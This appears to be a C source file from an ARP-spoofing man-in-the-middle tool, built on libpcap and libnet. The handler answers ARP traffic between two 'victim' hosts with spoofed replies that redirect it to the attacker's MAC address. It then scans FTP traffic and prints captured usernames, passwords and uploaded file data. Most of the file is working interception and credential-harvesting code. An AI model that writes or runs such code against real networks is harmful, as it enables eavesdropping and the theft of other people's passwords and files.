#include <stdio.h> 
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <pcap.h>
#include <netinet/in.h>
#include <netinet/if_ether.h>
#include <netinet/tcp.h>


#include <arpa/inet.h>
#include <libnet.h>


#include "packetManage.h"
#include "utils.h"
#include "targets.h"


void my_packet_handler(u_char *args, const struct pcap_pkthdr *header, const u_char *packet) {


	//ARP packet creation and allocation
	ARP_packet *arp=malloc(sizeof(ARP_packet));
	
	//Trying to convert packet into ARP
	if(ARP_packet_construct(arp,header,packet)!=-1){
		//do thing with arp object

		//process packets that came from victims
		if(maccmp(&arp->source,mac_victim1)==0&&(maccmp(&arp->target,mac_victim2)==0||maccmp(&arp->target,mac_attacker)==0||maccmp(&arp->target,mac_bcast)==0)){
			if(verbose==1)
                printf("     ☠️  ☠️  ☠️   packet intercepted from victim 1  ☠️  ☠️  ☠️   \n");
			replyARP(mac_victim1,ip_victim1,ip_victim2,mac_attacker,(libnet_t*)args);
		}
		if(maccmp(&arp->source,mac_victim2)==0&&(maccmp(&arp->target,mac_victim1)==0||maccmp(&arp->target,mac_attacker)==0||maccmp(&arp->target,mac_bcast)==0)){
            if(verbose==1)
                printf("     ☠️  ☠️  ☠️   packet intercepted from victim 2  ☠️  ☠️  ☠️   \n");
			replyARP(mac_victim2,ip_victim2,ip_victim1,mac_attacker,(libnet_t*)args);
		}

		ARP_free(arp);

		return;
	}else
		ARP_free(arp);



	//TCP packet creation and allocation
	TCP_packet *tcp=malloc(sizeof(TCP_packet));

	//Trying to convert packet into TCP
	if(TCP_packet_construct(tcp,header,packet)!=-1){



		//only processing TCP of port 20 or 21 because are the ports used by FTP
		if (ntohs(tcp->tcp_header_t->th_dport)==21||ntohs(tcp->tcp_header_t->th_dport)==20){

            //if payload start with USER
            if(strncmp(tcp->payload,"USER",4)==0){
                //if verbose is enabled print the payload
                if(verbose==1) {
                    printf("User name packet intercepted\n");
                    printPayload(tcp->payload, tcp->payload_length);
                }
            }
            //if payload start with PASS
            if(strncmp(tcp->payload,"PASS",4)==0){
                //if verbose is enabled print the payload
                if(verbose==1){
                    printf("Password packet intercepted\n");
                    printPayload(tcp->payload, tcp->payload_length);
                }
            }

            //if packet start with STOR
            if(strncmp(tcp->payload,"STOR",4)==0){
                //if verbose is enabled print the payload

                printf("Transmision of packet intercepted\n");
                printPayload(tcp->payload+4,tcp->payload_length-4);
            }


		}


		//TCP_free(tcp);
		return;
	}//else
		//TCP_free(tcp);
	//printf("Error obtaining packet type\n");

}
